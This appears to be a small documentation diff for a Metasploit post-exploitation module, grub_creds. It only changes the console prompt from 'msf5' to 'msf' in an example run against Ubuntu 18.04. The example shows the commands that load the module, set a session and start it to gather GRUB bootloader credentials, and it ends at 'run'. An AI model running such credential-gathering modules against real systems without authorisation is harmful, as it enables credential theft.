@@ -59,8 +59,8 @@ action.
 Typical run against Ubuntu 18.04 LTS
 
   ```
-msf5 exploit(handler) > use post/multi/gather/grub_creds
-msf5 post(grub_creds) > set SESSION 1
+msf exploit(handler) > use post/multi/gather/grub_creds
+msf post(grub_creds) > set SESSION 1
 SESSION => 1
 msf post(grub_creds) > run
 
